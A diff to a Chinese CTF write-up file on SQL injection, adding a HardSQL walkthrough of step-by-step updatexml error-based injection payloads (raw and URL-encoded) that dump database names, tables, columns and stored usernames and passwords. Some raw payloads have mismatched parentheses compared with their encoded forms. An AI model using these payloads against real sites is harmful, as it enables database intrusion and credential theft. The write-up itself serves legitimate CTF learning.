@@ -20,7 +20,7 @@
 4. 猜测select $_POST['query'] || flag from flag
 5. 拼接select *,1 from flag
 
-# [强网杯 2019]随便注 1
+# [强网杯 2019]随便注 1(堆叠注入)
 
 1. 用union联合查询
 
@@ -161,7 +161,7 @@ Payload："1';rename table `words` to `words1`;rename table `1919810931114514` t
 
    得到flag
 
-# [极客大挑战 2019]BabySQL 1
+# [极客大挑战 2019]BabySQL 1(双写绕过)
 
 1. 直接尝试万能密码1' or '1'='1    1' or '1'='1
 2. 直接进行sql注入
@@ -270,6 +270,68 @@ Payload："1';rename table `words` to `words1`;rename table `1919810931114514` t
     Url:
 
     username=1%27%20ununionion%20seselectlect%201,2,group_concat(flag)%20frfromom%20ctf.Flag%23&password=1
+
+# [极客大挑战 2019]HardSQL 1(报错注入)
+
+1. 尝试输入数字或字母，尝试万能密码不行，同时发现双写也被过滤掉了,同时空格，=，union也被过滤了
+2. 尝试报错注入
+
+   报错注入有两个函数，这里我们使用updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错
+
+   Payload:
+
+   username=1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#&password=1
+
+   Url:
+
+   username=1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=1
+3. 显示数据库geek
+
+   接下来查找表
+
+   Payload:
+
+   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#&password=1
+
+   Url:
+
+   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=1
+4. 得到H4rDsq1
+
+   接下来查字段
+
+   Payload:
+
+   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#&password=1
+
+   Url:
+
+   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=1
+5. 得到id,username,password
+
+   继续查询值
+
+   Payload:
+
+   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&password=1
+
+   Url：
+
+   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&password=1
+6. 发现flag并没有完全显示
+
+   使用right()查询后面部分
+
+   Payload:
+
+   username=1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#&password=1
+
+   Url:
+
+   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&password=1
+7. 拼接得到flag
+
+
 
 
 
